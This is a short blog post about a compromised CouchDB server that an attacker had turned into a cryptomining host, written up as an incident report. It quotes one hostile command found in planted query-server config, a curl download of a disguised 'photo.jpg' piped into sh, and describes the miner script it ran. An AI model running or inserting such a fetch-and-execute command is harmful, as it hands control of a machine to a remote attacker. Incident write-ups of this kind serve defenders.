---
title: "CouchDB RCE Attack!"
description: "A few months ago, the server that ran our CouchDB instance went down. Upon further investigation, we find that the CPU usage was at 100%!!! That’s really odd because CouchDB isn’t a very resource…"
date: "2018-04-20T19:45:14.183Z"
categories: 
  - JavaScript

published: true
canonicalLink: https://medium.com/filiosoft/couchdb-rce-attack-573ba7a512df
---

A few months ago, the server that ran our CouchDB instance went down. Upon further investigation, we find that the CPU usage was at 100%!!! That’s really odd because CouchDB isn’t a very resource intensive process. When I investigated further, I found that CPU usage on the VM had been hovering around 90% CPU since late November! I also found a few databases that shouldn’t have been there. As well as config that shouldn’t have been there. There were Query Servers that did something like this:

\`\`\`

curl http://<ip-address>/photo.jpg | sh

\`\`\`

I was immediately suspicious. Why would there be a query server that downloads an image and runs it as a script? Unless there was someone was being malicious.

I looked at the script and found that it did a few things. First, it attempted to kill off quite a few processes. Things like \`minergate\`, \`xmrig\`, and more. Most of them appeared to be crypto miner processes. After cleaning all those up, it downloaded it’s own crypto miner and started it. It also changed some kernel params.

[https://justi.cz/security/2017/11/14/couchdb-rce-npm.html](https://medium.com/r/?url=https%3A%2F%2Fjusti.cz%2Fsecurity%2F2017%2F11%2F14%2Fcouchdb-rce-npm.html)